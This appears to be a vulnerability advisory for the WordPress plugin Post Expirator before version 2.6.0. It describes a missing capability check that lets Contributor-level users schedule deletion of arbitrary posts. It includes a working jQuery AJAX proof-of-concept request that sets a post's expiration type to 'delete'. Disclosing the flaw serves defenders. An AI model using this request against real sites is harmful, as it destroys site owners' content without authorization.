## WordPress Plugin Vulnerabilities

# Post Expirator < 2.6.0 - Contributor+ Arbitrary Post Schedule Deletion

### Description

The plugin does not have proper capability checks in place, which could allow users with a role as low as Contributor to schedule deletion of arbitrary posts.

### Proof of Concept

Run on "Posts" page:
jQuery.post(ajaxurl,{
nonce: config.ajax.nonce,
action:"manage\_wp\_posts\_using\_bulk\_quick\_save\_bulk\_edit",
post\_ids:[783],
expirationdate\_status:"change-add",
/\* UTC timestamp \*/
expirationdate\_month:9,
expirationdate\_day:22,
expirationdate\_year:2021,
expirationdate\_hour:20,
expirationdate\_minute:55,
expirationdate\_expiretype:"delete"
})
